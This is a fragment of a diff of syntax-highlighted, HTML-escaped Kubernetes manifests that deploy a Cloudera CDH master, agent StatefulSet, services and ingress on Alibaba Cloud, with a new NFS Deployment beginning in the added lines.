-  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- effect: NoSchedule&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;key: node-role.kubernetes.io/master&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;restartPolicy: Always&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;automountServiceAccountToken: true&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;hostname: master-svc&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: cloudera-master&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;image: registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-master:5.14.2&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: IfNotPresent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;limits:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;memory: &quot;4096Mi&quot;&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;cpu: &quot;1000m&quot;&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;lifecycle:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;preStop:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;exec:&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;command: [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/cloudera-init/run/stop.sh &amp;gt;&amp;gt; /cloudera/log/stop.log 2&amp;gt;&amp;amp;1&quot;]&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;#- name: cloudera-init&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#mountPath: /cloudera-init/run/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: mysql&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /var/lib/mysql/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cloudera/parcel-repo/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;env:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: HOSTNAME&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;configMapKeyRef:&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;key: master_host&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: POD_IP&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;fieldRef:&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;apiVersion: v1&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;fieldPath: status.podIP&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: POD_NAME&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;fieldRef:&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;apiVersion: v1&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;fieldPath: metadata.name&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 7180&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: ui&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 9000&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 7182&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: server&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 7191&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: parcel&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 4434&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;securityContext:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;privileged: true&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;imagePullSecrets:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: registrykey-vpc&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/repo/&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: mysql&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/master/&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;#- name: cloudera-init&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;#configMap:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#name: cloudera-config&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#defaultMode: 0751&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#items:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#- key: master.start&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;#path: start.sh&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#- key: master.stop&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;#path: stop.sh&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;#- key: mysql.sql&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;#path: mysql.sql&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;configMap:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;items:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;- key: config.ini&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;path: config.ini&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: master-svc&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: master-svc&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;clusterIP: None&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 9000&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 9000&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: server&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7182&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7182&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: parcel&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7191&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7191&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 4434&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 4434&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: ui&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7180&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7180&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: master-external&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: master-external&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: ui&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7180&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7180&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: policy/v1beta1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: PodDisruptionBudget&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: agent-pdb&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: agent-pdb&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;maxUnavailable: 1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: agent-svc&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: agent-svc&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;clusterIP: None&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 9000&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 9000&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: server&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7182&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7182&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: parcel&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 7191&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 7191&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 4434&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 4434&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl2&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;port: 4433&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;targetPort: 4433&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: StatefulSet&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: agent-sts&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;serviceName: agent-svc&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;updateStrategy:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;type: RollingUpdate&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;podManagementPolicy: OrderedReady&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;replicas: 3&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: cagent&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- effect: NoSchedule&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;key: node-role.kubernetes.io/master&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;restartPolicy: Always&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;automountServiceAccountToken: true&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;image: registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-node:5.14.2&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: IfNotPresent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;limits:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;memory: &quot;4096Mi&quot;&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;cpu: &quot;1000m&quot;&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;lifecycle:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;preStop:&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;exec:&lt;/span&gt;
-              &lt;span class=&quot;no&quot;&gt;command: [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/cloudera-init/run/stop.sh&quot;]&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cloudera/parcel-repo/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: lib&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/lib/cloudera-scm-agent/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 9000&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 7182&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: server&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 7191&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: parcel&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 4434&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- containerPort: 4433&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl2&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;securityContext:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;privileged: true&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;imagePullSecrets:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: registrykey-vpc&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;configMap:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;items:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;- key: config.ini&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;path: config.ini&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;- key: cron.tab&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;path: cron.tab&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/repo/&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;volumeClaimTemplates:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;- metadata:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: lib&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;#volumeName: lib&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;volumeMode: Filesystem&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;accessModes: [ &quot;ReadWriteOnce&quot; ]&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;storageClassName: cloudera-storage&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;requests:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;storage: 20Gi&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: extensions/v1beta1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Ingress&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: cdh-master-ing&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;rules:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;- host: cdh.docs.aliyun.com&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;http:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;paths:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- backend:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;serviceName: master-external&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;servicePort: 7180&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;apps/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Deployment&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs-deploy&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;replicas&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;revisionHistoryLimit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;matchLabels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs&lt;/span&gt;
